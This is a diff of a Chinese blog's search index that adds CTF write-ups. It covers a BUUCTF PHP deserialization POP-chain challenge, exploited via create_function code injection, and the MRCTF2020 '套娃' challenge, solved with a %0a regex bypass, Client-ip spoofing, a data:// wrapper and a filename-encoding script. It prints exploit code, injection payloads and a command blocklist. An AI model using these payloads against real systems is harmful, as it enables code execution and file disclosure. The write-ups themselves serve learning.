@@ -2420,6 +2420,7 @@ if(isset($_GET['exp'])){
 
 <p>这句话令我想法多了起来，现有的想法是有什么代码可以把坐标值打印</p>
 <p>然后根据坐标值编写相应的调用turtle库的代码</p>
+<h3 id="ReadTimeoutError-HTTPSConnectionPool-host-’files-pythonhosted-org’-port-443-Read-timed-out"><a href="#ReadTimeoutError-HTTPSConnectionPool-host-’files-pythonhosted-org’-port-443-Read-timed-out" class="headerlink" title="ReadTimeoutError: HTTPSConnectionPool(host=’files.pythonhosted.org’, port=443): Read timed out."></a>ReadTimeoutError: HTTPSConnectionPool(host=’files.pythonhosted.org’, port=443): Read timed out.</h3><p><a href="https://www.cnblogs.com/ring1992/p/13971119.html">Python报错ReadTimeoutError: HTTPSConnectionPool(host=’files.pythonhosted.org’, port=443): Read timed out. - Ring_1992 - 博客园 (cnblogs.com)</a></p>
 ]]></content>
       <tags>
         <tag>博客</tag>
@@ -3921,11 +3922,19 @@ public function __toString()&#123;
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$b-&gt;arg&#x3D;&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br></pre></td></tr></table></figure>
 
 <p>变量b赋值<br>}这个是为了闭合前面的<br>//这个是为了注释后面的</p>
-<p>base64绕或正则过滤，var_dump输出数据，get_defined_vars()函数返回由所有已定义变量所组成的数组。</p>
+<p>base64绕过正则过滤，var_dump输出数据，get_defined_vars()函数返回由所有已定义变量所组成的数组。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a-&gt;var&#x3D;$b;</span><br></pre></td></tr></table></figure>
 
 <p>将b的值与a联系，触发_invoke函数从而触发show()</p>
 <p>最后再序列化a</p>
+<p>不过我们得先找到flag到底在哪个文件里：</p>
+<p>经过热心同学的帮助，今天才懂得 include flag.php 包含的意思</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">就相当于现在flag.php里面的变量已经同步到我现在这个php文件里面</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">比如说我在1.php 写include “flag.php”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">那么这个时候</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag.php里面定义过的变量还有函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我在1.php里面也可以用</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以在赋值时先直接打印当前php文件的变量值(也就是相当于打印flag.php里的内容)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$b-&gt;arg&#x3D;&quot;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/25/buu/23/image-20210926192749869.png" alt="image-20210926192749869"></p>
 <p>放上exp：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line">    <span class="keyword">public</span> $arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="keyword">$this</span>-&gt;func) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="keyword">$this</span>-&gt;arg)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            $func(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;func=<span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">$b-&gt;arg=<span class="string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;</span><br><span class="line">$a-&gt;var=$b;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -3935,6 +3944,67 @@ public function __toString()&#123;
 <p><img src="/2021/09/25/buu/23/image-20210925200601616.png" alt="image-20210925200601616"></p>
 <p>之后再看看这篇文章</p>
 <p>[php反序列化之pop链_L1ni01-CSDN博客_pop链](<a href="https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP%E9%93%BE%E4%BB%8B%E7%BB%8D">https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP链介绍</a> POP 面向属性编程 (Property-Oriented,Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是 从现有运行环境 中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链%2C最终达到攻击者邪恶的目的)</p>
+<p>经过提示知道这题和BJDCTF的ezphp很像</p>
+<h4 id="BJDCTF-Ezphp"><a href="#BJDCTF-Ezphp" class="headerlink" title="BJDCTF Ezphp"></a>BJDCTF Ezphp</h4><p>[<a href="https://www.cnblogs.com/rabbittt/p/13323155.html">BJDCTF2020]EzPHP - Rabbittt - 博客园 (cnblogs.com)</a></p>
+<p>这一篇文章解释了前面闭合的问题:</p>
+<p><img src="/2021/09/25/buu/23/image-20210926202437436.png" alt="image-20210926202437436"></p>
+<p>这样代码实际就只执行了return $arg  这一句，完成了逃逸</p>
+<p><strong>PHP 的 <code>create_function()</code> 代码注入</strong></p>
+<p><a href="https://www.gem-love.com/ctf/770.html">2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L’Amore (gem-love.com)</a></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MRCTF2020 套娃</title>
+    <url>/2021/09/28/buu/24/</url>
+    <content><![CDATA[<p>​    参考了Y1ng大佬的博客：<a href="https://www.gem-love.com/ctf/2184.html">https://www.gem-love.com/ctf/2184.html</a></p>
+<p>真的写得很棒，看着十分舒服，还在评论区提出一点小建议（希望不会被师傅嘲笑）</p>
+<p>这题难度不大，我卡在了编写脚本上</p>
+<p><img src="/2021/09/28/buu/24/image-20210928193418732.png" alt="image-20210928193418732"></p>
+<p>常规源码查看</p>
+<p><img src="/2021/09/28/buu/24/image-20210928193507092.png" alt="image-20210928193507092"></p>
+<p>这里的绕过和BJDCTF的Ezphp一段代码类似，本来以为也可以url编码绕过</p>
+<p>结果上面出现了计数：%5f不能出现，因为_编码后就是%5f,所以就要求其他方法绕过了</p>
+<p>_ 用 ‘  ’ 绕过，而后面的正则匹配表示匹配字符串的开头和结尾</p>
+<p>在字符串中换行可以表示字符串的结尾，所以可以用%0a（换行符的url编码）绕过</p>
+<p>所以payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?b u p t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/28/buu/24/image-20210928194036030.png" alt="image-20210928194036030"></p>
+<p>得到提示</p>
+<p>去访问secrettw.php页面</p>
+<p><img src="/2021/09/28/buu/24/image-20210928194130440.png" alt="image-20210928194130440"></p>
+<p>whoa，被挡了</p>
+<p>添加Client-ip：127.0.0.1</p>
+<p><img src="/2021/09/28/buu/24/image-20210928194319439.png" alt="image-20210928194319439"></p>
+<p>再次查看源码：</p>
+<p><img src="/2021/09/28/buu/24/image-20210928194351650.png" alt="image-20210928194351650"></p>
+<p>原来是和js有关的代码，</p>
+<p><img src="/2021/09/28/buu/24/image-20210928194516235.png" alt="image-20210928194516235"></p>
+<p>提示我们posy传参Merak</p>
+<p>任意赋值：Merak=1</p>
+<p><img src="/2021/09/28/buu/24/image-20210928194610158.png" alt="image-20210928194610158"></p>
+<p>好了，源码出来了</p>
+<p>代码分析：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function change($v)&#123; </span><br><span class="line">  $v &#x3D; base64_decode($v); </span><br><span class="line">  $re &#x3D; &#39;&#39;; </span><br><span class="line">  for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">    $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">  &#125; </span><br><span class="line">  return $re; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以写一个逆向的脚本来满足要求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function unchange($v)&#123; </span><br><span class="line">    $re &#x3D; &#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) - $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">$real_flag &#x3D; unchange(&#39;flag.php&#39;);</span><br><span class="line">echo base64_encode($real_flag);</span><br><span class="line">&#x2F;&#x2F;ZmpdYSZmXGI&#x3D;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到：ZmpdYSZmXGI=</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission! Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>ip我们已经添加了</p>
+<p>传入参数2333用伪协议绕过，?2333=data://text/plain,todat is a happy day</p>
+<p>这里有的师傅特意用了base64绕过：data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</p>
+<p>file传入我们尚书脚本跑出的数据：file=ZmpdYSZmXGI=</p>
+<p>到这里小心一个坑，就是不用再post传参了：</p>
+<p>不然会被highlight_file函数截断</p>
+<p>然后一键flag啦</p>
+<p><img src="/2021/09/28/buu/24/image-20210928195347754.png" alt="image-20210928195347754"></p>
+<p><img src="/2021/09/28/buu/24/image-20210928195408850.png" alt="image-20210928195408850"></p>
 ]]></content>
       <tags>
         <tag>buu</tag>
